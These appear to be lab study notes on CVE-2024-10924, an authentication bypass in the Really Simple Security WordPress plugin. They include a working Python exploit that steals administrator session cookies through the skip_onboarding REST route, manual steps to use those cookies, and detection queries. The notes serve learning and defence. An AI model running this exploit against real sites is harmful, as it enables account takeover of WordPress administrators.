# CVE-2024-10924

[NIST - CVE-2024-10924](https://nvd.nist.gov/vuln/detail/CVE-2024-10924) States CVE-2024-10924 is *"The Really Simple Security (Free, Pro, and Pro Multisite) plugins for WordPress are vulnerable to authentication bypass in versions 9.0.0 to 9.1.1.1. This is due to improper user check error handling in the two-factor REST API actions with the 'check_login_and_get_user' function. This makes it possible for unauthenticated attackers to log in as any existing user on the site, such as an administrator, when the "Two-Factor Authentication" setting is enabled (disabled by default)."* More specifically the `skip_onboarding` feature manages the 2FA onboarding process for a user, redirecting after authentication passing parameters to `check_login_and_get_user`, `skip_onboarding` feature **does not validate the return value** of `check_login_and_get_user`.

This vulnerability is found in the source code:
`$insertParentDir/wp-content/plugins/really-simple-ssl/security/wordpress/two-fa`
in the `Rsssl_Two_Factor_On_Board_Api` class

THM Exploit PoC - cookie stealer
```python
import requests
import urllib.parse
import sys

if len(sys.argv) != 2:
    print("Usage: python exploit.py <user_id>")
    sys.exit(1)

user_id = sys.argv[1]

url = "http://vulnerablewp.thm:8080/?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding"
data = {
    "user_id": int(user_id),  # User ID from the argument
    "login_nonce": "invalid_nonce",  # Arbitrary value
    "redirect_to": "/wp-admin/"  # Target redirection
}

# Sending the POST request
response = requests.post(url, json=data)

# Checking the response
if response.status_code == 200:
    print("Request successful!\n")
    
    # Extracting cookies
    cookies = response.cookies.get_dict()
    count = 1

    for name, value in cookies.items():
        decoded_value = urllib.parse.unquote(value)  # Decode the URL-encoded cookie value
        print(f"Cookie {count}:")
        print(f"Cookie Name: {name}")
        print(f"Cookie Value: {decoded_value}\n")
        count += 1
else:
    print("Request failed!")
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")
```

1. Get two cookie and their names
2. Make two cookies in Dev tools with their names 
3. go `/wp-admin`

#### Detection and Mitigation

- Check Weblogs for API Calls
	- `/?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding`
- Analyse Authentication Logs where two-factor authentication is bypassed.

[[OpenSearch]] Query
```sql
method:POST AND path:"/reallysimplessl/v1/two_fa/skip_onboarding"
```


[Really Simple Security plugin officially patch](https://github.com/Really-Simple-Plugins/really-simple-ssl/blob/master/)


## References

[THM bypass really simple security](https://tryhackme.com/room/bypassreallysimplesecurity)
[NIST - CVE-2024-10924](https://nvd.nist.gov/vuln/detail/CVE-2024-10924) 
[Really Simple Security plugin officially patch](https://github.com/Really-Simple-Plugins/really-simple-ssl/blob/master/)